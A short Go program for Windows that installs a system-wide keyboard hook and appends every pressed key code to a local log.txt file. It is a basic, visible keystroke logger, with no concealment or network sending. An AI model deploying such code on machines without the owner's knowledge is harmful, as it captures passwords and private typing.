// +build windows

package main

import (
	"fmt"
	"os"

	"github.com/moutend/go-hook/pkg/keyboard"
	"github.com/moutend/go-hook/pkg/types"
)

func main() {
	filename := "log.txt"
	// Buffer size is depends on your need. The 100 is placeholder value.
	keyboardChan := make(chan types.KeyboardEvent, 100)

	if err := keyboard.Install(nil, keyboardChan); err != nil {
		return
	}

	defer keyboard.Uninstall()

	fmt.Println("start capturing keyboard input")

	for {
		select {
		case k := <-keyboardChan:
			if k.Message == types.WM_KEYDOWN || k.Message == types.WM_SYSKEYDOWN {
				vkCodeStr := fmt.Sprint(k.VKCode) // VK_1, VK_2
				if len(vkCodeStr) > 3 && vkCodeStr[:3] == "VK_" {
					vkCodeStr = vkCodeStr[3:]
				}
				err := saveToFile(filename, fmt.Sprintf("%s ", vkCodeStr))
				if err != nil {
					fmt.Printf("Error Saving to File: %v\n", err)
				}
			}
		}
	}
}

func saveToFile(filename, content string) error {
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0777)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = file.WriteString(content)
	return err
}